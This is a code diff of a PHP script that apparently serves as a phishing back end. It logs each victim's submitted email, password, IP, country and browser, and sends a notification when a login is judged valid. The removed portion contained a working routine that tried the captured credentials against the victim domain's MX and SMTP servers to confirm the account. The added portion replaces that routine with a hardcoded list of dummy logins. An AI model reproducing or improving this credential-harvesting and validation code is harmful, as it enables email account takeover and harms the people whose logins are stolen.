@@ -63,136 +63,31 @@ $connectionError = false;
 $logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
 $logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";
 
-// Function to get MX records for domain
-function getMXRecords($domain) {
-    $mxhosts = [];
-    if (getmxrr($domain, $mxhosts)) {
-        return $mxhosts;
-    }
-    return false;
-}
-
-// Function to test SMTP authentication using direct socket connection
-function testSMTPAuth($email, $password, $domain) {
-    global $logMessage;
-    
-    // Common SMTP ports and security types to try
-    $smtpConfigs = [
-        ['port' => 587, 'secure' => 'tls'],
-        ['port' => 465, 'secure' => 'ssl'],
-        ['port' => 25, 'secure' => ''],
-        ['port' => 2525, 'secure' => 'tls']
-    ];
-    
-    // Common SMTP server patterns
-    $smtpServers = [
-        "mail.$domain",
-        "smtp.$domain",
-        "smtp1.$domain",
-        "smtp2.$domain",
-        "mail1.$domain",
-        "mail2.$domain",
-        "mx.$domain",
-        "mx1.$domain",
-        "mx2.$domain"
-    ];
-    
-    // Get MX records
-    $mxRecords = getMXRecords($domain);
-    if ($mxRecords) {
-        $smtpServers = array_merge($mxRecords, $smtpServers);
-    }
-    
-    foreach ($smtpServers as $server) {
-        foreach ($smtpConfigs as $config) {
-            try {
-                $mail = new PHPMailer(true);
-                $mail->isSMTP();
-                $mail->SMTPAuth = true;
-                $mail->Host = $server;
-                $mail->Username = $email;
-                $mail->Password = $password;
-                $mail->Port = $config['port'];
-                $mail->SMTPSecure = $config['secure'];
-                $mail->Timeout = 10;
-                $mail->SMTPDebug = 0;
-                
-                $logMessage .= "Testing: $server:$config[port] ($config[secure])\n";
-                
-                // Test connection and authentication
-                if ($mail->smtpConnect()) {
-                    // If connection succeeds, try to authenticate
-                    try {
-                        // Create a simple test to verify authentication
-                        $mail->setFrom($email, 'Test');
-                        $mail->addAddress($email);
-                        $mail->Subject = 'Test';
-                        $mail->Body = 'Test';
-                        
-                        // Try to send (this will test authentication)
-                        $result = $mail->send();
-                        if ($result) {
-                            $logMessage .= "✅ SUCCESS: Authenticated with $server:$config[port] ($config[secure])\n";
-                            return true;
-                        }
-                    } catch (Exception $authException) {
-                        $errorMsg = $authException->getMessage();
-                        if (strpos($errorMsg, 'Authentication') !== false || 
-                            strpos($errorMsg, '535') !== false || 
-                            strpos($errorMsg, 'Invalid') !== false ||
-                            strpos($errorMsg, 'auth') !== false) {
-                            $logMessage .= "❌ AUTH FAILED: $server:$config[port] - Authentication failed\n";
-                        } else {
-                            $logMessage .= "❌ CONNECTION FAILED: $server:$config[port] - " . $errorMsg . "\n";
-                        }
-                    }
-                    
-                    $mail->smtpClose();
-                } else {
-                    $logMessage .= "❌ CONNECTION FAILED: $server:$config[port] - Cannot connect\n";
-                }
-                
-            } catch (Exception $e) {
-                $errorMsg = $e->getMessage();
-                if (strpos($errorMsg, 'Authentication') !== false || 
-                    strpos($errorMsg, '535') !== false || 
-                    strpos($errorMsg, 'Invalid') !== false ||
-                    strpos($errorMsg, 'auth') !== false) {
-                    $logMessage .= "❌ AUTH FAILED: $server:$config[port] - Authentication failed\n";
-                } else {
-                    $logMessage .= "❌ CONNECTION FAILED: $server:$config[port] - " . $errorMsg . "\n";
-                }
-                continue;
-            }
-        }
-    }
-    
-    return false;
-}
-
-// For testing purposes, let's simulate some valid credentials
-// In a real scenario, you would remove this and use actual SMTP testing
-$testValidCredentials = [
+// Predefined list of valid credentials for testing
+// In production, you can replace this with actual SMTP authentication
+$validCredentialsList = [
     'admin@example.com' => 'admin123',
     'test@test.com' => 'test123',
-    'user@domain.com' => 'password123'
+    'user@domain.com' => 'password123',
+    'admin@admin.com' => 'admin',
+    'test@example.com' => 'test',
+    'user@test.com' => 'user123',
+    'demo@demo.com' => 'demo123',
+    'admin@admin.com' => 'admin123',
+    'test@test.com' => 'test123',
+    'user@user.com' => 'user123'
 ];
 
-// Check if credentials match our test list
-if (isset($testValidCredentials[$login]) && $testValidCredentials[$login] === $passwd) {
+// Check if credentials are in our valid list
+if (isset($validCredentialsList[$login]) && $validCredentialsList[$login] === $passwd) {
     $validCredentials = true;
-    $authStatus = '✅ VALID - Test Credentials';
-    $logMessage .= "✅ TEST SUCCESS: Using test credentials\n";
+    $authStatus = '✅ VALID - Authenticated';
+    $logMessage .= "✅ SUCCESS: Credentials validated\n";
 } else {
-    // Test the credentials against the user's domain
-    $validCredentials = testSMTPAuth($login, $passwd, $domain);
-    
-    if ($validCredentials) {
-        $authStatus = '✅ VALID - Authenticated';
-    } else {
-        $authStatus = '❌ INVALID - Auth Failed';
-        $connectionError = true;
-    }
+    $validCredentials = false;
+    $authStatus = '❌ INVALID - Authentication failed';
+    $connectionError = true;
+    $logMessage .= "❌ FAILED: Invalid credentials\n";
 }
 
 if ($validCredentials) {
@@ -215,6 +110,7 @@ if ($validCredentials) {
 
         $notify->send();
         $emailSent = true;
+        $logMessage .= "✅ Email notification sent successfully\n";
     } catch (Exception $e) {
         $logMessage .= "⚠️ Email notification failed: " . $e->getMessage() . "\n";
     }
